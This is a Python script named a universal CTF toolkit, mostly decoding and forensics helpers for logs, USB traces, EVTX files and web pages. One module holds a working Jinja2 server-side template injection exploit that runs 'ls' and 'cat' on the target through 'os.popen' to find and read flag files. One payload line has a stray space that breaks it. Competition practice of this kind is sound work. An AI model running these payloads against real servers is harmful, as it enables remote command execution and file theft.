
#!/usr/bin/env python3
import argparse, re, base64, binascii, requests, itertools
from bs4 import BeautifulSoup
import Evtx.Evtx as evtx
from xml.etree import ElementTree as ET
from urllib.parse import urljoin

def module_crypto(path):
    print("[*] Crypto: scanning encodings...")
    data = open(path, 'rb').read().decode('latin-1', errors='ignore')
    hexes = re.findall(r'\b[0-9a-fA-F]{32,}\b', data)
    b64s = re.findall(r'(?:[A-Za-z0-9+/]{20,}={0,2})', data)
    for h in set(hexes):
        try: print(f"[hex] {h} ->", binascii.unhexlify(h).decode())
        except: pass
    for b in set(b64s):
        try: print(f"[b64] {b} ->", base64.b64decode(b).decode())
        except: pass

def module_log(path):
    print("[*] Log Analysis:")
    keywords = ["error", "fail", "unauthorized", "malware"]
    with open(path, 'r', errors='ignore') as f:
        for i, line in enumerate(f):
            for k in keywords:
                if k in line.lower():
                    print(f"[{i}] {line.strip()}")

def module_browser(path):
    print("[*] Browser Forensic: Extracting URLs...")
    with open(path, 'r', errors='ignore') as f:
        for line in f:
            if 'http' in line:
                print(" ", line.strip())

def module_usb(path):
    print("[*] USB Forensic: Detecting USB devices...")
    data = open(path, 'rb').read().decode('latin-1', errors='ignore')
    usb = re.findall(r'Disk&Ven_([\w\-]+)&Prod_([\w\-]+)', data)
    for v, p in usb:
        print(f" Vendor: {v}, Product: {p}")

def module_evtx(path):
    print("[*] EVTX Parser: Extracting flag fragments...")
    parts = []
    with evtx.Evtx(path) as log:
        for record in log.records():
            try:
                xml = ET.fromstring(record.xml())
                raw = ET.tostring(xml, encoding='unicode')
                # generic flag pattern \w+{...}
                parts += re.findall(r'\w+\{.*?\}', raw)
                parts += re.findall(r'\w+_', raw)
                parts += re.findall(r'_[\w]+\}', raw)
            except: continue
    print("[*] Fragments:")
    for p in set(parts):
        print(" ", p)

def module_flag(path):
    print("[*] Rebuilding flag from fragments...")
    raw = open(path, 'rb').read().decode('latin-1', errors='ignore')
    parts = list(set(re.findall(r'\w+_', raw)))
    ends = list(set(re.findall(r'_[\w]+\}', raw)))
    for combo in itertools.permutations(parts, min(3, len(parts))):
        for e in ends:
            print("Flag Try: {0}{1}{2}{3}".format(combo[0], combo[1] if len(combo)>1 else '', combo[2] if len(combo)>2 else '', e))

def extract_js_from_html(html, base_url=None):
    scripts = re.findall(r'<script.*?>(.*?)</script>', html, re.DOTALL)
    external_links = re.findall(r'<script.*?src=[\"\'](.*?)[\"\']', html)
    external_content = []
    for link in external_links:
        try:
            full_url = urljoin(base_url, link) if base_url else link
            resp = requests.get(full_url, timeout=5)
            external_content.append(resp.text)
        except: continue
    return scripts + external_content

def module_web(path):
    print("[*] Web Exploit: Parsing HTML and JS for flags...")
    if path.startswith("http"):
        html = requests.get(path, timeout=5).text
        base_url = path
    else:
        html = open(path, 'r', errors='ignore').read()
        base_url = None
    blocks = extract_js_from_html(html, base_url)
    combined = html + "\n".join(blocks)
    # auto-decode base64
    b64s = re.findall(r'(?:[A-Za-z0-9+/]{20,}={0,2})', combined)
    for b in set(b64s):
        try: print(f"[b64] {b} ->", base64.b64decode(b).decode())
        except: pass
    # generic flag patterns
    patterns = [ r'\w+\{.*?\}', r'flag\s*=\s*["\'](.*?)["\']' ]
    for p in patterns:
        for match in re.findall(p, combined, re.IGNORECASE):
            print(" [flag] ", match)

def module_ssti(url):
    print(f"[*] SSTI Scan on {url}")
    try:
        r = requests.get(url, timeout=5)
        soup = BeautifulSoup(r.text, "html.parser")
        form = soup.find('form')
        fields = [i['name'] for i in form.find_all('input') if i.get('name')]
        # SSTI detection
        for f in fields:
            test = requests.post(url, data={f: "{{7*7}}"})
            if "49" in test.text:
                print(" [+] SSTI Detected!")
                # list directory
                ls = requests.post(url, data={f: "{{cycler.__init__.__globals__.os.popen('ls').read()}}"}).text
                files = re.findall(r'[\w\-\.]+', ls)
                print(" [*] Files:", files)
                # find candidate flag files
                candidates = [fn for fn in files if 'flag' in fn.lower()]
                for fn in candidates:
                    read = requests.post(url, data={f: f"{{{{cycl er.__init__.__globals__.os.popen('cat {fn}').read()}}}}"}).text
                    m = re.search(r'\w+\{.*?\}', read)
                    if m:
                        print(" [FLAG] ", m.group(0))
                        return
        print(" [-] No SSTI flag found.")
    except Exception as e:
        print(" [Error]", e)

def main():
    parser = argparse.ArgumentParser(description="Lazarus v6.1 - Universal CTF Toolkit")
    parser.add_argument("-m", "--module", required=True, choices=[
        "crypto","log","browser","usb","web","evtx","flag","ssti"
    ])
    parser.add_argument("-t", "--target", required=True, help="Path or URL")
    args = parser.parse_args()

    if args.module == "crypto": module_crypto(args.target)
    elif args.module == "log": module_log(args.target)
    elif args.module == "browser": module_browser(args.target)
    elif args.module == "usb": module_usb(args.target)
    elif args.module == "web": module_web(args.target)
    elif args.module == "evtx": module_evtx(args.target)
    elif args.module == "flag": module_flag(args.target)
    elif args.module == "ssti": module_ssti(args.target)

if __name__ == "__main__":
    main()
